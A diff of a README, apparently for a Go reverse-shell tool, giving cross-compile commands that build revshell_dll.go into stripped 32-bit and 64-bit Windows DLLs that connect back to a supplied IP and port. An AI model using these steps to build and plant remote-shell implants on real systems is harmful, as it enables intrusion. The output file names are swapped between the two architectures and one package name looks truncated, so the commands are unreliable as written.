@@ -43,11 +43,18 @@ You will need to install the following packages on Ubuntu
 
 <code>sudo apt install golang gcc build-essential gcc-mingw-w64-x86-64 gcc-mingw-w64-i68</code>
 
+
 Cross compile on Linux for Windows:
+
+
 32 bit DLL
+
 <code>env GOOS=windows GOARCH=386 CGO_ENABLED=1 CC=i686-w64-mingw32-gcc go build -ldflags="-s -w" -buildmode=c-shared -o revshell64.dll revshell_dll.go</code>
 
+
 64 bit DLL
+
+
 <code>env GOOS=windows GOARCH=amd64 CGO_ENABLED=1 CC=x86_64-w64-mingw32-gcc go build -ldflags="-s -w" -buildmode=c-shared -o revshell32.dll revshell_dll.go</code>
 
 To run, provide the IP address and port as command line arguments:
